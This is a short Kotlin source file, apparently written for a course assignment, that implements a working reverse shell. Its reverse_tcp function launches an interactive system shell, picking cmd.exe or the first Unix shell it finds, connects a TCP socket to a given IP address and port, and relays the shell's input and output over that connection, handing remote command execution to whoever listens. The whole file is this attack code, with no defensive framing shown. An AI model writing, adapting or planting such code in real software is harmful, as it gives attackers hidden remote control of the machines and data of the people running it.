package com.example.assignment1

import java.io.File
import java.io.IOException
import java.net.Socket

object reverseShell {
    fun reverse_tcp(ip: String?, port: Int) {
        try {
            val shellPath = getShellPath()
            val str = arrayOf(shellPath, "-i")
            val shellProcess = Runtime.getRuntime().exec(str)
            val processInput = shellProcess.inputStream
            val processOutput = shellProcess.outputStream
            val processError = shellProcess.errorStream
            val socket = Socket(ip, port)
            val socketInput = socket.getInputStream()
            val socketOutput = socket.getOutputStream()
            while (true) {
                while (processInput.available() > 0) socketOutput.write(processInput.read())
                while (processError.available() > 0) socketOutput.write(processError.read())
                while (socketInput.available() > 0) processOutput.write(socketInput.read())
                socketOutput.flush()
                processOutput.flush()
            }
        } catch (e: IOException) {
            e.printStackTrace()
        } catch (e: StringIndexOutOfBoundsException) {
            e.printStackTrace()
        }
    }

    fun getShellPath(): String? {
        val os = System.getProperty("os.name").lowercase()
        if (os.startsWith("windows"))
            return "cmd.exe"
        else {
            val shellLocations = arrayOf("/bin/bash", "/bin/sh", "/bin/csh", "/bin/ksh")
            for (shellLocation in shellLocations) {
                val shell = File(shellLocation)
                if (shell.exists())
                    return shell.absolutePath
            }
        }
        return null
    }
}